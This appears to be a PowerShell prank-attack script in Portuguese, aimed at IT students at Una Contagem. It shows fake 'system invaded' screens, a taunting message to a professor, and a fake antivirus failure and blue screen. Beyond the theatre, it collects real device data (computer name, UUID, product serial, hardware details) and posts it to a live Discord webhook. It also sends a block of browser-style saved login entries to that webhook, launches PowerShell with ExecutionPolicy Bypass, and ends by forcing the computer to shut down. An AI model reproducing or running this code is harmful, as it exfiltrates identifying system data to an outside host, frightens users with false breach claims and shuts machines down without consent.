cls
Write-Host "" -BackgroundColor Black -ForegroundColor Black  # Preenche a tela com "nada"
Start-Sleep -Seconds 15
cls  # Limpa de novo antes de continuar

# Adicionando o tipo para interagir com a API do Windows
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Window {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int Width, int Height, uint uFlags);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
}
"@

# Função para colocar a janela do PowerShell no topo
$hwnd = [Window]::FindWindow([NullString]::Value, "Windows PowerShell")
[Window]::SetWindowPos($hwnd, [IntPtr]::Zero, 0, 0, 0, 0, 0x0001) # 0x0001 = SWP_NOMOVE + SWP_NOSIZE (não move nem redimensiona, só coloca no topo)

# Configuração da janela PowerShell
$Host.UI.RawUI.WindowSize = New-Object Management.Automation.Host.Size(1525, 825)
$Host.UI.RawUI.WindowPosition = New-Object Management.Automation.Host.Coordinates(0, 0)

# Estilo hacker: fundo preto, texto vermelho
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "Red"
Clear-Host

Start-Sleep -Seconds 3

# Preencher a tela com frase contínua
$frase = ("ERRO NA SIMULACAO SISTEMA INVADIDO " * 500)
$largura = $host.UI.RawUI.WindowSize.Width
$altura = $host.UI.RawUI.WindowSize.Height
for ($i = 0; $i -lt $altura; $i++) {
    $linha = ""
    while ($linha.Length -lt $largura) { $linha += $frase }
    Write-Host $linha.Substring(0, $largura) -ForegroundColor Red
    if ($i -eq 0) { Start-Sleep -Seconds 4 }
    Start-Sleep -Milliseconds 100
}

Start-Sleep -Milliseconds 500
Clear-Host

# Efeito piscando com a frase central
for ($i = 0; $i -lt 20; $i++) {
    Clear-Host
    if ($i % 2 -eq 0) { Write-Host "`n`n`t`tSISTEMA INVADIDO..." -ForegroundColor Red }
    Start-Sleep -Milliseconds 80
}

Clear-Host
Start-Sleep -Milliseconds 300

# Função para remover acentos
function Remove-Acentos { param(
    [string]$texto
)
    $remap = @{ 'á'='a';'â'='a';'ã'='a';'à'='a';'ä'='a'; 'é'='e';'ê'='e';'è'='e';'ë'='e'; 'í'='i';'ì'='i';'î'='i';'ï'='i'; 'ó'='o';'ô'='o';'õ'='o';'ò'='o';'ö'='o'; 'ú'='u';'ù'='u';'û'='u';'ü'='u'; 'ç'='c' }
    return ($texto.ToCharArray() | ForEach-Object { if ($remap.ContainsKey($_)) { $remap[$_] } else { $_ } }) -join ''
}

# Frases da simulação
$frases = @(
    "Boa Noite , Alunos de TI da Una Contagem.",
    "Desculpa atrapalhar a simulacao de voces, mas agora isso e um ataque real.",
    "Lembra de mim, professor Daniel ?",
    "Sou o aluno que voce reprovou 2x por conversar muito em sala.",
    "Eu nao tinha futuro nessa area segundo voce...",
    "Mas parece que agora as coisas mudaram nao e mesmo. >:)",
    "A todos os alunos que estao conectados a rede Wi-Fi da Una,",
    "Seus dados acabam de ser roubados por mim... ;)",
    "Nao adianta desconectar, ja finalizei a coleta",
    "Podem agradecer ao professor de voces por ter me ensinado a hackear, ADEUS. >:)",
    "HAHAHAA..."
)

# Digitação das frases
foreach ($fraseInstr in $frases) {
    $texto = Remove-Acentos $fraseInstr
    foreach ($char in $texto.ToCharArray()) {
        Write-Host -NoNewline $char
        Start-Sleep -Milliseconds 50  # Digitação 70% mais lenta
    }
    Write-Host
    Start-Sleep -Seconds 1.5
}

# Simulação de Analise Antivirus
Clear-Host
Write-Host "O Windows Defender detectou uma ameaca critica: system32.dll comprometido. Iniciando reparacao..." -ForegroundColor Yellow

# Progresso aleatorio crescente
$progress = 0
while ($progress -lt 100) {
    $incremento = Get-Random -Minimum 5 -Maximum 15
    $progress = [Math]::Min(100, $progress + $incremento)
    Write-Host "Tentando reparar... Progresso: $progress%" -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
}

Clear-Host
Write-Host "Falha na reparacao. Sistema comprometido." -ForegroundColor Yellow
Start-Sleep -Seconds 2

# EFEITO Flickering
Clear-Host
Write-Host "FALHA NO ANTIVIRUS WINDOWS DEFENDER" -ForegroundColor White
Start-Sleep -Seconds 3
for ($i = 0; $i -lt 20; $i++) {
    Clear-Host; Write-Host "SISTEMA CORROMPIDO" -ForegroundColor Yellow
    Start-Sleep -Milliseconds 50; Clear-Host; Start-Sleep -Milliseconds 50
}

Start-Sleep -Seconds 2
Clear-Host

# Explosao de caracteres aleatorios
$endTime = (Get-Date).AddSeconds(6)
while ((Get-Date) -lt $endTime) {
    $linha = -join ((1..$largura) | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 126) })
    Write-Host $linha -ForegroundColor Green
    Start-Sleep -Milliseconds 20
}

# Tela Azul da Morte Falsa (BSOD)
Clear-Host
# Muda cores para azul e texto branco
$host.UI.RawUI.BackgroundColor = "Blue"
$host.UI.RawUI.ForegroundColor = "White"
Clear-Host
Write-Host "O Windows encontrou um problema e precisa reiniciar. Codigo de erro: CRITICAL_PROCESS_DIED"
Start-Sleep -Seconds 5

# Restaurar cores originais e exibir mensagem de erro
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "Red"
Clear-Host
Write-Host "Erro inesperado. Sistema comprometido." -ForegroundColor Red
Start-Sleep -Seconds 2


# Efeito de Sobreposicao de Janelas
for ($j = 0; $j -lt 5; $j++) {
    Start-Process powershell.exe -ArgumentList @(
        '-ExecutionPolicy','Bypass',
        '-NoProfile','-WindowStyle','Normal',
        '-Command', "Write-Host 'Arquivo corrompido! Erro no sistema! Acesso nao autorizado!' -ForegroundColor Yellow; Start-Sleep -Seconds 2; exit"
    )
    Start-Sleep -Milliseconds 200
}

# Pausa para exibir e fechar automaticamente as janelas
Start-Sleep -Seconds 4

# Efeito de Desligamento Falso
Clear-Host
for ($i = 5; $i -ge 1; $i--) {
    Write-Host "SISTEMA SERA DESLIGADO EM: $i..." -ForegroundColor White
    Start-Sleep -Seconds 1; Clear-Host
}
Write-Host "Desligamento cancelado. Acesso remoto estabelecido." -ForegroundColor Red
Start-Sleep -Seconds 3
Clear-Host

# Simulacao de Controle Remoto
$mensagens = @(
    "Transmissao de dados em andamento...",
    "Coletando credenciais armazenadas...",
    "Monitorando sistema remotamente...",
    "Acessando arquivos confidenciais...",
    "Extraindo dados do navegador..."
)
for ($i = 0; $i -lt 10; $i++) {
    Clear-Host
    $msg = $mensagens | Get-Random
    Write-Host $msg -ForegroundColor Yellow
    Start-Sleep -Seconds 3
}

# Final
Clear-Host
Write-Host "Sistema monitorado remotamente. Acesso completo ao sistema." -ForegroundColor Green
Start-Sleep -Seconds 3
Clear-Host
Write-Host "Operacao concluida com sucesso." -ForegroundColor Green
Start-Sleep -Seconds 2

# ---------- Envio de senhas via webhook em partes ----------

# Função para remover acentos
function Remove-Acentos {
    param (
        [string]$texto
    )
    $texto = $texto.Normalize([Text.NormalizationForm]::FormD)
    $texto = $texto -replace '[^\x00-\x7F]', ''
    return $texto
}

# Webhook do Discord
$webhookUrl = 'https://discord.com/api/webhooks/1369358979137933493/fJ6KaFJusD5kkYfKw4OX37QidReuvZvwyBooR75tp1MOOZc4vAAs4XBIYvWO2ZZObPm8'

# Coletando informações do sistema
$dataHora = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
$nomeDispositivo = $env:COMPUTERNAME
$processador = (Get-WmiObject -Class Win32_Processor).Name
$memoria = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB
$memoriaDisponivel = (Get-WmiObject -Class Win32_OperatingSystem).FreePhysicalMemory / 1MB
$idDispositivo = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
$idProduto = (Get-WmiObject -Class Win32_OperatingSystem).SerialNumber
$tipoSistema = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture
$entradaCanetaToque = (Get-WmiObject -Class Win32_DesktopMonitor).MonitorType

# Criando as mensagens separadas
$mensagens = @(
    "Data/Hora: $dataHora",
    "Nome do dispositivo: $nomeDispositivo",
    "Processador: $processador",
    "RAM instalada: $([math]::round($memoria, 2)) GB (utilizável: $([math]::round($memoria - ($memoriaDisponivel / 1024), 2)) GB)",
    "ID do dispositivo: $idDispositivo",
    "ID do Produto: $idProduto",
    "Tipo de sistema: $tipoSistema",
    "Caneta e toque: $entradaCanetaToque"
)

# Remover acentos das mensagens
$mensagens = $mensagens | ForEach-Object { Remove-Acentos $_ }

# Enviando cada mensagem separadamente
foreach ($mensagem in $mensagens) {
    # Garantir que o conteúdo não ultrapasse o limite de 2000 caracteres do Discord
    if ($mensagem.Length -gt 1900) {
        $mensagem = $mensagem.Substring(0, 1900)
    }

    # Criando o JSON para enviar a mensagem
    $json = @{ content = $mensagem } | ConvertTo-Json -Depth 3

    try {
        # Envia a mensagem para o Discord
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $json
        Write-Output "Mensagem enviada com sucesso."
    } catch {
        Write-Output "Erro ao enviar mensagem: $_"
    }

    # Aguarda 500ms antes de enviar a próxima mensagem
    Start-Sleep -Milliseconds 500
}

# URL do seu webhook
$webhookUrl = 'https://discord.com/api/webhooks/1369358979137933493/fJ6KaFJusD5kkYfKw4OX37QidReuvZvwyBooR75tp1MOOZc4vAAs4XBIYvWO2ZZObPm8'

# Texto completo com todas as entradas de senha
$texto = @"
URL               : android://wctWuKakwAKDfVz8mX57MZAbZVXmfVwlkN8yHs6TuGuEfxswKtHq5qxOWI0RPBi55t1j2td7DaRC_cF8R3qlUQ==@com.waze/
Web Browser       : Chrome
User Name         : gustavo.waze
Password          : senhateste
Password Strength : Strong
Filename          : C:\Users\gusta\AppData\Local\Google\Chrome\User Data\Default\Login Data

URL               : https://store.steampowered.com/login/
Web Browser       : Chrome
User Name         : jogosdegraca
Password          : steam22
Password Strength : Medium
Filename          : C:\Users\gusta\AppData\Local\Google\Chrome\User Data\Default\Login Data

URL               : https://ulife.com.br/Login.aspx
Web Browser       : Chrome
User Name         : 123456@Ulife.com.br
Password          : segredo123
Password Strength : Strong
Filename          : C:\Users\gusta\AppData\Local\Google\Chrome\User Data\Default\Login Data

URL               : https://www.santander.com.br/cartoes/personalize
Web Browser       : Chrome
User Name         : gustavo@gmail.com
Password          : semgrana
Password Strength : Strong
Filename          : C:\Users\gusta\AppData\Local\Google\Chrome\User Data\Default\Login Data

URL               : https://www.udemy.com/join/login-popup/
Web Browser       : Chrome
User Name         : gustavo@gmail.com
Password          : fakefake
Password Strength : Medium
Filename          : C:\Users\gusta\AppData\Local\Google\Chrome\User Data\Default\Login Data

URL               : https://www.ulife.com.br/login.aspx
Web Browser       : Chrome
User Name         : 123456@Ulife.com.br
Password          : segredo123
Password Strength : Strong
Filename          : C:\Users\gusta\AppData\Local\Google\Chrome\User Data\Default\Login Data

URL               : https://www50.fgv.br/NovoCadastro.aspx
Web Browser       : Chrome
User Name         : 123.456.789.10
Password          : minhasenhafalsa
Password Strength : Strong
Filename          : C:\Users\gusta\AppData\Local\Google\Chrome\User Data\Default\Login Data
"@

# Quebra em partes de até 1900 caracteres e envio
$chunks = @()
while ($texto.Length -gt 0) {
    $size = [Math]::Min(1900, $texto.Length)
    $chunks += $texto.Substring(0, $size)
    $texto = $texto.Substring($size)
}

foreach ($chunk in $chunks) {
    $payload = @{
        content = '```' + $chunk + '```'
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payload
    Start-Sleep -Seconds 1
}

Write-Host "`nEncerrando em 3 segundos..." -ForegroundColor Red
Start-Sleep -Seconds 1
Write-Host "2..."
Start-Sleep -Seconds 1
Write-Host "1..."
Start-Sleep -Seconds 1
Stop-Computer -Force
